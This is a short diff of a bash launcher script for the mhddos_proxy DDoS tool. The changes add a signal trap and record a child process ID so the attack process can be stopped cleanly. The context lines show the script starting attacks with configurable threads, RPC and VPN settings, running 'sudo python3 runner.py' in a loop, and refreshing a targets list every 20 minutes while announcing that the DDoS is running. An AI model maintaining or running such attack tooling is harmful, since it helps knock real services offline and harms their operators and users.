@@ -64,7 +64,7 @@ fi
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
 sleep 7s
 
-
+trap 'echo signal received!; kill "${PID}"; wait "${PID}"' SIGINT SIGTERM
 
 # Restarts attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
@@ -134,6 +134,7 @@ do
             cd ~/mhddos_proxy
             #sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $rpc
             sudo python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
+	    PID="$!"
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
